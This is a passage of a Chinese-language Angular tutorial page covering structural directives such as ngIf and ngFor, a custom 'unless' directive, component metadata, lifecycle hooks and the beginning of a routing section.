</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="结构型指令"><a href="#结构型指令" class="header-anchor">#</a> 结构型指令</h3> <ul><li>ngIf</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>语法糖<span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>div <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;condition&quot;</span><span class="token operator">&gt;</span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>Angular <span class="token number">2.</span>x中使用template<span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>ng<span class="token operator">-</span>template <span class="token punctuation">[</span>ngIf<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;condition&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>div<span class="token operator">&gt;</span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>使用else块</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>div <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;condition; else elseBlock&quot;</span><span class="token operator">&gt;</span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>ng<span class="token operator">-</span>template #elseBlock<span class="token operator">&gt;</span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>使用then和else块</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>div <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;condition; then thenBlock else elseBlock&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>ng<span class="token operator">-</span>template #thenBlock<span class="token operator">&gt;</span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>ng<span class="token operator">-</span>template #elseBlock<span class="token operator">&gt;</span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>使用as语法</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>div <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;condition as value; else elseBlock&quot;</span><span class="token operator">&gt;</span><span class="token punctuation">{</span><span class="token punctuation">{</span>value<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>ng<span class="token operator">-</span>template #elseBlock<span class="token operator">&gt;</span><span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>NgIfContext</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular\packages\common\src\directives\ng_if.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgIfContext</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> $implicit<span class="token operator">:</span> any <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> ngIf<span class="token operator">:</span> any <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><ul><li>ngFor</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;ul&gt;
      &lt;li *ngFor=&quot;let item of items; let i = index&quot;&gt;
        {{i}}. {{item}}
      &lt;/li&gt;
    &lt;/ul&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span>
  items <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'First'</span><span class="token punctuation">,</span> <span class="token string">'Second'</span><span class="token punctuation">,</span> <span class="token string">'Third'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>NgForOfContext</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// packages/common/src/directives/ng_for_of.ts</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgForOfContext</span><span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span>
      <span class="token parameter"><span class="token keyword">public</span> $implicit<span class="token operator">:</span> <span class="token constant">T</span><span class="token punctuation">,</span> 
      <span class="token keyword">public</span> ngForOf<span class="token operator">:</span> NgIterable<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> 
      <span class="token keyword">public</span> index<span class="token operator">:</span> number<span class="token punctuation">,</span>
      <span class="token keyword">public</span> count<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">first</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">last</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">===</span> <span class="token keyword">this</span><span class="token punctuation">.</span>count <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">even</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>index <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
  <span class="token keyword">get</span> <span class="token function">odd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>even<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// 定义可迭代的类型</span>
<span class="token keyword">export</span> type NgIterable<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span> <span class="token operator">=</span> Array<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span><span class="token operator">|</span> Iterable<span class="token operator">&lt;</span><span class="token constant">T</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>使用 [hidden] 属性控制元素可见性存在的问题</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>div <span class="token punctuation">[</span>hidden<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;!showGreeting&quot;</span><span class="token operator">&gt;</span>
  Hello<span class="token punctuation">,</span> there<span class="token operator">!</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>上面的代码在通常情况下，都能正常工作。但当在对应的 DOM 元素上设置 display: flex 属性时，尽管[hidden] 对应的表达式为 true，但元素却能正常显示。对于这种特殊情况，则推荐使用 *ngIf。</p></div> <h3 id="自定义结构指令"><a href="#自定义结构指令" class="header-anchor">#</a> 自定义结构指令</h3> <p>指令功能描述：该指令实现 ngIf 指令相反的效果，当指令的输入条件为 Falsy 值时，显示DOM元素。</p> <p>1.指令实现</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'[exeUnless]'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">UnlessDirective</span> <span class="token punctuation">{</span>
  @<span class="token function">Input</span><span class="token punctuation">(</span><span class="token string">'exeUnless'</span><span class="token punctuation">)</span>
  <span class="token keyword">set</span> <span class="token function">condition</span><span class="token punctuation">(</span><span class="token parameter">newCondition<span class="token operator">:</span> boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>newCondition<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 创建模板对应的内嵌视图</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>viewContainer<span class="token punctuation">.</span><span class="token function">createEmbeddedView</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>templateRef<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>viewContainer<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> templateRef<span class="token operator">:</span> TemplateRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">,</span>
     <span class="token keyword">private</span> viewContainer<span class="token operator">:</span> ViewContainerRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>2.指令应用</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;h1 [exeBackground]=&quot;'red'&quot; *exeUnless=&quot;condition&quot;&gt;Hello {{name}}&lt;/h1&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> 
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span>  <span class="token punctuation">{</span>
  name <span class="token operator">=</span> <span class="token string">'Angular'</span><span class="token punctuation">;</span> 
  condition<span class="token operator">:</span> boolean <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="directive-component"><a href="#directive-component" class="header-anchor">#</a> Directive/Component</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// angular2/packages/core/src/metadata/directives.ts</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">Directive</span> <span class="token punctuation">{</span>
   selector<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>  <span class="token comment">// 用于定义组件在HTML代码中匹配的标签</span>
   inputs<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 指令的输入属性</span>
   outputs<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 指令的输出属性</span>
   host<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> string<span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment">// 绑定宿主的属性、事件等</span>
   providers<span class="token operator">?</span><span class="token operator">:</span> Provider<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 设置指令及其子指令可以用的服务</span>
   exportAs<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>  <span class="token comment">// 导出指令，使得可以在模板中调用</span>
   queries<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">[</span>key<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> any<span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment">// 设置指令的查询条件</span>
<span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">Component</span> <span class="token keyword">extends</span> <span class="token class-name">Directive</span> <span class="token punctuation">{</span>
   changeDetection<span class="token operator">?</span><span class="token operator">:</span> ChangeDetectionStrategy<span class="token punctuation">;</span>  <span class="token comment">// 指定组件使用的变化检测策略</span>
   viewProviders<span class="token operator">?</span><span class="token operator">:</span> Provider<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">// 设置组件及其子组件(不含ContentChildren)可以用的服务</span>
   moduleId<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>  <span class="token comment">// 包含该组件模块的 id，它被用于解析 模版和样式的相对路径</span>
   templateUrl<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>  <span class="token comment">// 为组件指定一个外部模板的URL地址</span>
   template<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">;</span>  <span class="token comment">// 为组件指定一个内联的模板</span>
   styleUrls<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 为组件指定一系列用于该组件的样式表文件</span>
   styles<span class="token operator">?</span><span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 为组件指定内联样式</span>
   animations<span class="token operator">?</span><span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 设置组件相关动画</span>
   encapsulation<span class="token operator">?</span><span class="token operator">:</span> ViewEncapsulation<span class="token punctuation">;</span>  <span class="token comment">// 设置组件视图包装选项</span>
   interpolation<span class="token operator">?</span><span class="token operator">:</span> <span class="token punctuation">[</span>string<span class="token punctuation">,</span> string<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// 设置默认的插值运算符，默认是&quot;{{&quot;和&quot;}}&quot;</span>
   entryComponents<span class="token operator">?</span><span class="token operator">:</span> Array<span class="token operator">&lt;</span>Type<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token operator">|</span>any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>  <span class="token comment">// 设置需要被提前编译的组件</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h2 id="生命周期"><a href="#生命周期" class="header-anchor">#</a> 生命周期</h2> <h3 id="指令-组件共有"><a href="#指令-组件共有" class="header-anchor">#</a> 指令/组件共有</h3> <ul><li>ngOnChanges</li> <li>ngOnInit</li> <li>ngDoCheck</li> <li>ngOnDestroy</li></ul> <h3 id="组件特有"><a href="#组件特有" class="header-anchor">#</a> 组件特有</h3> <ul><li>ngAfterContentInit</li> <li>ngAfterContentChecked</li> <li>ngAfterViewInit</li> <li>ngAfterViewChecked</li></ul> <h3 id="钩子作用-调用顺序"><a href="#钩子作用-调用顺序" class="header-anchor">#</a> 钩子作用/调用顺序</h3> <ul><li>ngOnChanges - 当数据绑定输入属性的值发生变化时调用</li> <li>ngOnInit - 在第一次 ngOnChanges 后调用</li> <li>ngDoCheck - 自定义的方法，用于检测和处理值的改变</li> <li>ngAfterContentInit - 在组件内容初始化之后调用</li> <li>ngAfterContentChecked - 组件每次检查内容时调用</li> <li>ngAfterViewInit - 组件相应的视图初始化之后调用</li> <li>ngAfterViewChecked - 组件每次检查视图时调用</li> <li>ngOnDestroy - 指令销毁前调用</li></ul> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>ngOnInit 用于在 Angular 获取输入属性后初始化组件，该钩子方法会在第一次 ngOnChanges 之后被调用。</p> <p>在构造函数中，是无法获取输入属性的值，而在 ngOnInit 方法中，我们能正常获取输入属性的值。因为组件的构造函数会优先执行。</p> <p>当 ChildComponent 组件输入属性变化时会自动触发 ngOnChanges 钩子，然后在调用 ngOnInit 钩子方法。</p> <p>构造函数一般用于依赖注入或执行一些简单的初始化操作。组件获取输入属性之后，需执行组件初始化操作放在 ngOnInit 钩子中去执行</p></div> <h3 id="lifecyclehooks接口"><a href="#lifecyclehooks接口" class="header-anchor">#</a> LifecycleHooks接口</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">OnChanges</span> <span class="token punctuation">{</span> <span class="token function">ngOnChanges</span><span class="token punctuation">(</span>changes<span class="token operator">:</span> SimpleChanges<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span> <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">DoCheck</span> <span class="token punctuation">{</span> <span class="token function">ngDoCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">OnDestroy</span> <span class="token punctuation">{</span> <span class="token function">ngOnDestroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">AfterContentInit</span> <span class="token punctuation">{</span> <span class="token function">ngAfterContentInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">AfterContentChecked</span> <span class="token punctuation">{</span> <span class="token function">ngAfterContentChecked</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">AfterViewInit</span> <span class="token punctuation">{</span> <span class="token function">ngAfterViewInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">AfterViewChecked</span> <span class="token punctuation">{</span> <span class="token function">ngAfterViewChecked</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="simplechange"><a href="#simplechange" class="header-anchor">#</a> SimpleChange</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 用于表示变化对象</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">SimpleChange</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">public</span> previousValue<span class="token operator">:</span> any<span class="token punctuation">,</span> 
      <span class="token keyword">public</span> currentValue<span class="token operator">:</span> any<span class="token punctuation">,</span> 
      <span class="token keyword">public</span> firstChange<span class="token operator">:</span> boolean</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
      
  <span class="token comment">// 标识是否为首次变化</span>
  <span class="token function">isFirstChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>firstChange<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="simplechanges"><a href="#simplechanges" class="header-anchor">#</a> SimpleChanges</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">SimpleChanges</span> <span class="token punctuation">{</span> <span class="token punctuation">[</span>propName<span class="token operator">:</span> string<span class="token punctuation">]</span><span class="token operator">:</span> SimpleChange<span class="token punctuation">;</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="路由"><a href="#路由" class="header-anchor">#</a> 路由</h2> <h3 id="路由要素"><a href="#路由要素" class="header-anchor">#</a> 路由要素</h3> <table><thead><tr><th style="text-align:left;">路由器部件</th> <th style="text-align:left;">含义</th></tr></thead> <tbody><tr><td style="text-align:left;">Router（路由器）</td> <td style="text-align:left;">为激活的 URL 显示应用组件。管理从一个组件到另一个组件的导航</td></tr> <tr><td style="text-align:left;">RouterModule</td> <td style="text-align:left;">一个独立的 NgModule，用于提供所需的服务提供商，以及用来在应用视图之间进行导航的指令。</td></tr> <tr><td style="text-align:left;">Routes（路由数组）</td> <td style="text-align:left;">定义了一个路由数组，每一个都会把一个 URL 路径映射到一个组件。</td></tr> <tr><td style="text-align:left;">Route（路由）</td> <td style="text-align:left;">定义路由器该如何根据 URL 模式（pattern）来导航到组件。大多数路由都由路径和组件类构成。</td></tr> <tr><td style="text-align:left;">RouterOutlet（路由出口）</td> <td style="text-align:left;">该指令（）用来标记出路由器该在哪里显示视图。</td></tr> <tr><td style="text-align:left;">RouterLink（路由链接）</td> <td style="text-align:left;">这个指令把可点击的 HTML 元素绑定到某个路由。点击带有 routerLink 指令（绑定到字符串或链接参数数组）的元素时就会触发一次导航。</td></tr> <tr><td style="text-align:left;">RouterLinkActive（活动路由链接）</td> <td style="text-align:left;">当 HTML 元素上或元素内的routerLink变为激活或非激活状态时，该指令为这个 HTML 元素添加或移除 CSS 类。</td></tr> <tr><td style="text-align:left;">ActivatedRoute（激活的路由）</td> <td style="text-align:left;">为每个路由组件提供提供的一个服务，它包含特定于路由的信息，比如路由参数、静态数据、解析数据、全局查询参数和全局碎片（fragment）。</td></tr> <tr><td style="text-align:left;">RouterState（路由器状态）</td> <td style="text-align:left;">路由器的当前状态包含了一棵由程序中激活的路由构成的树。它包含一些用于遍历路由树的快捷方法。</td></tr> <tr><td style="text-align:left;">Link parameters array(链接参数数组)</td> <td style="text-align:left;">这个数组会被路由器解释成一个路由操作指南。你可以把一个RouterLink绑定到该数组，或者把它作为参数传给Router.navigate方法。</td></tr> <tr><td style="text-align:left;">Routing component(路由组件)</td> <td style="text-align:left;">一个带有RouterOutlet的 Angular 组件，它根据路由器的导航来显示相应的视图。</td></tr></tbody></table> <p>下图中涉及了路由的大部分知识，路由配置、传参方式、路由守卫等，添加子路由时，routerLink的值需要在斜杠/的前面加.不加时将直接到根路由寻找，如果匹配到相同的路径则显示相应的组件，匹配不到则匹配**路径 。</p> <p><img src="/vuebloger/img/post/20190609213716139.png" alt=""></p> <p>关于路由传参，有三种方式，下面一一介绍。</p> <h3 id="url传参"><a href="#url传参" class="header-anchor">#</a> URL传参</h3> <ol><li>进行路由配置见上图。</li> <li>配置好之后在routerLink上配置、传参，如下</li></ol> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>btn btn-primary<span class="token punctuation">&quot;</span></span> <span class="token attr-name">routerLink</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>./router-child2/{{id}}/{{name}}<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>路径传值<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
